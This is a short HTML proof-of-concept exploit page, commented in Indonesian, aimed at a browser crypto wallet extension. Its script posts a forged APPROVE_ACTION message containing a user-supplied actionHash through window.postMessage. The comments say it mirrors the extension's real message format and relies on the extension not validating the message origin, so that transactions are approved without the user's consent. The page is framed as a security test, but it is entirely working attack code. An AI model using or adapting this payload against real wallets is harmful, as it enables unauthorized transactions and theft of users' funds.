<!DOCTYPE html>
<html>
<head>
    <title>Exploit PoC: Action Approval</title>
</head>
<body>
    <h1>Security Test: Transaction Approval</h1>
    <input type="text" id="actionHash" placeholder="Masukkan actionHash dari EXECUTE_TRANSACTION_RES" style="width: 300px;">
    <button id="approveBtn">Approve & Execute Action</button>

    <script>
        document.getElementById('approveBtn').addEventListener('click', () => {
            const hash = document.getElementById('actionHash').value;

            // Struktur pesan nyata berdasarkan file background/actionMessaging.ts
            const msg = {
                type: "APPROVE_ACTION",
                data: {
                    actionHash: hash
                }
            };

            // Mengirim pesan ke ekstensi melalui window.postMessage
            // Jika dompet rentan, ia akan memproses APPROVE_ACTION tanpa validasi origin
            window.postMessage(msg, window.location.origin);
            
            console.log("APPROVE_ACTION dikirim dengan Hash:", hash);
        });
    </script>
</body>
</html>
